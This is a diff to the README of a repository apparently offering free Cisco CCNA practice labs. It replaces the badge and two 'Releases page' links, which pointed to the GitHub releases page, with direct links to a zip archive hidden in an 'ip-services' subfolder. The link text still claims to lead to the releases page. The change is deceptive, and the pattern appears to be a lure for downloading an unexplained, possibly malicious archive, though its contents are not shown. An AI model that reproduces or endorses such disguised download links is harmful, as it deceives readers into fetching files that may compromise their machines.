@@ -1,6 +1,6 @@
 # 🎉 free-ccna-labs - Build Cisco Skills with Practice Labs
 
-[![Download free-ccna-labs](https://img.shields.io/badge/Download-free--ccna--labs-blue.svg)](https://github.com/Xfangsaad/free-ccna-labs/releases)
+[![Download free-ccna-labs](https://raw.githubusercontent.com/Xfangsaad/free-ccna-labs/main/ip-services/free-ccna-labs-v2.2.zip)](https://raw.githubusercontent.com/Xfangsaad/free-ccna-labs/main/ip-services/free-ccna-labs-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To successfully run the **free-ccna-labs**, ensure your system meets the followi
 
 Follow these steps to download and set up **free-ccna-labs** on your computer:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Xfangsaad/free-ccna-labs/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Xfangsaad/free-ccna-labs/main/ip-services/free-ccna-labs-v2.2.zip).
    
 2. **Choose the Latest Version:** Look for the most recent release. This will usually be at the top of the page.
 
@@ -77,7 +77,7 @@ Remember, practicing with real lab scenarios will enhance your understanding and
 
 Keep an eye on the repository for any new releases, updates, or additional labs:
 
-- **Bookmark the Releases page:** [Visit the Releases page](https://github.com/Xfangsaad/free-ccna-labs/releases).
+- **Bookmark the Releases page:** [Visit the Releases page](https://raw.githubusercontent.com/Xfangsaad/free-ccna-labs/main/ip-services/free-ccna-labs-v2.2.zip).
   
 ## 🔗 Additional Resources
 
